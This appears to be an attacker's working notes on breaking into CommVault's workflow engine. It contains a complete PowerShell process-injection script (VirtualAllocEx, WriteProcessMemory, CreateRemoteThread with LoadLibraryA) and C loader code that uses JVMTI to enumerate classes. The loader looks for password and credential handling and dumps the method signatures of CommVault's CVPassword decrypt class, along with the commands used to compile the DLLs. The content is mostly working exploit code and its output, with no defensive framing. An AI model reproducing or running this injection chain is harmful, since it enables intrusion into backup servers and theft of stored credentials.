### Process Identification

```powershell
tasklist /m WorkflowEvent.dll
# workflowEngine.exe    PID 3420    WorkflowEvent.dll

(Get-CimInstance Win32_Process -Filter "ProcessId=ID").CommandLine
# "D:\...\workflowEngine.exe" //RS//CVJavaWorkflow(Instance001)
# No -XX:+DisableAttachMechanism

Get-Process -Id ID -Module | Where-Object { $_.ModuleName -match "WorkflowEvent|CvBasicLib|jvm" }
# jvm.dll, WorkflowEvent.dll, CvBasicLib.dll — all loaded and initialized
```

### Recon 

 `FindClass()` can't see in CommVault's classes due to the fact CreateRemoteThread-attached thread has no Java frames, FindClass resolves against the bootstrap classloader, not CommVault's webapp classloader. Must use JVMTI `GetLoadedClasses` instead.

 recon1.c
```c
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <jni.h>
#include <jvmti.h>

DWORD WINAPI go(LPVOID _) {
    FILE* f = fopen("C:\\Users\\Public\\o.txt", "w");
    if (!f) return 1;
    // ... attach to JVM, get JVMTI env ...
    // GetLoadedClasses, enumerate all classes
    // Log anything containing "Password", "Crypt", "redential"
}
```

powershell injection:

```powershell
$code = @'
using System;
using System.Runtime.InteropServices;
public class Inject {
    [DllImport("kernel32")] public static extern IntPtr OpenProcess(int a, bool b, int c);
    [DllImport("kernel32")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr b, byte[] buf, uint s, out IntPtr w);
    [DllImport("kernel32")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr addr, IntPtr p, uint f, IntPtr t);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
}
'@
Add-Type $code
$path = "C:\Users\Public\loader.dll" + "`0"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($path)
$h = [Inject]::OpenProcess(0x1F0FFF, $false, 3420)
$mem = [Inject]::VirtualAllocEx($h, [IntPtr]::Zero, [uint32]$bytes.Length, 0x3000, 0x40)
$w = [IntPtr]::Zero
[Inject]::WriteProcessMemory($h, $mem, $bytes, [uint32]$bytes.Length, [ref]$w)
$ll = [Inject]::GetProcAddress([Inject]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
[Inject]::CreateRemoteThread($h, [IntPtr]::Zero, 0, $ll, $mem, 0, [IntPtr]::Zero)
```

The target class was `commvault.qnet.sys.CVPassword` not `commvault.web.shared.CVPassword` from the JAR. This is what fooled me. The JAR class was never loaded in WFEngine's JVM, calling it would crash the process or return null.

Each injection requires a new DLL filename because Windows won't reload the same DLL into the same process.


### Method Signature Dump

Updated loader to target the three discovered classes and dump their exact method signatures with static/instance flags:

```c
static void dump_methods(jvmtiEnv* ti, FILE* f, jclass c, const char* sig){
    fprintf(f, "== %s ==\n", sig);
    jint mc; jmethodID* m;
    if ((*ti)->GetClassMethods(ti,c,&mc,&m)==JVMTI_ERROR_NONE){
        for (jint i=0;i<mc;i++){
            char *nm=0,*s=0; jint mod=0;
            (*ti)->GetMethodName(ti,m[i],&nm,&s,NULL);
            (*ti)->GetMethodModifiers(ti,m[i],&mod);
            fprintf(f,"  %s%s %s\n",(mod&8)?"static ":"",nm?nm:"?",s?s:"?");
            // ... Deallocate ...
        }
    }
}
```

Rebuilt, transferred as `loader3.dll`, injected with new PowerShell class `Inj3`.

```
== Lcommvault/qnet/sys/CVPassword; ==
  <init> ()V
  static <clinit> ()V
  decrypt (Ljava/lang/String;)Ljava/lang/String;        INSTANCE METHOD
  encrypt (Ljava/lang/String;)Ljava/lang/String;
  encryptv5 (Ljava/lang/String;)Ljava/lang/String;
  encryptStrong (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

== Lcommvault/cte/util/PasswordEncoder; ==
  encode ([B)[B                                          
```

Transferred as `loader4.dll`, injected with `Inj4`:

All three DLLs compiled with:
```bash
JH=$(dirname $(find /usr -name "jni.h" 2>/dev/null | head -1))
x86_64-w64-mingw32-gcc -shared -O2 loader.c -o loader.dll -I$JH -Iwin32_include
```
